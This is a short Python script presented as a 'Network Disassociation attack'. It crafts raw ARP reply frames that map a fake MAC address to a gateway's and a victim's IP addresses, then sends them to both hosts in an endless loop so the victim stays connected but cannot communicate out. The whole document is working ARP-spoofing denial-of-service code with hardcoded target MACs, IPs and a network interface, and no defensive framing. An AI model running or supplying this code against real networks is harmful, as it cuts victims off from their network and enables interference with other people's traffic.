'''
Network Disassociation attack

The victim will remain connected to the gateway but cant communicate out.
'''

import socket
import struct
import binascii

s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
s.bind(("wlp2s0",socket.htons(0x0800)))

sor = "\x48\x41\x43\x4b\x45\x52" # Random Mac Address for dissasociation.

vicmac = "\x08\x00\x27\x5c\xdf\x59" #Victims Mac
gatemac = "\x00\x21\x04\xd1\x7f\xf8" #Gateway Mac
code = "\x08\x06"
eth1 = vicmac+sor+code #for victim
eth2 = gatemac+sor+code #for gateway

htype = "\x00\x01"
protype = "\x08\x00"
hsize = "\x06"
psize = "\x04"
opcode = "\x00\x02"

gate_ip = "192.168.1.254" #Gateway ip
victim_ip = "192.168.1.72" #victim IP

gip = socket.inet_aton(gate_ip)
vip = socket.inet_aton(victim_ip)

arp_victim = eth1+htype+protype+hsize+psize+opcode+sor+gip+vicmac+vip
arp_gateway = eth2+htype+protype+hsize+psize+opcode+sor+vip+gatemac+gip


while 1:
	s.send(arp_victim)
	s.send(arp_gateway)

